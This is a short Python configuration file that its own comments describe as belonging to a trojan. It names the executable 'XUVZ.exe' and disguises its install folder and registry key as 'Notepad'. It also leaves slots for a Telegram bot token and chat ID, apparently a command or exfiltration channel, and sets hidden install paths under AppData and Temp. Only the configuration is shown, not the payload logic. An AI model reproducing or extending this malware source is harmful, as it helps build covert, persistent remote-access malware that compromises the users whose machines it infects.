import os


APPNAME = "XUVZ.exe" #Trojan Name
DIRNAME = "Notepad" #Trojan Folder Name
NAMEOFREGKEY = "Notepad" #Registry Key to be named
TOKEN = "Your Token"
CHAT_ID = "Your ChatID"


APPDATADIR = os.getenv("Appdata")+f"\\{DIRNAME}"
LOCALAPPDATADIR = os.getenv("LocalAppdata")+f"\\{DIRNAME}"
TEMPDIR = os.getenv("Temp")+f"\\{DIRNAME}"

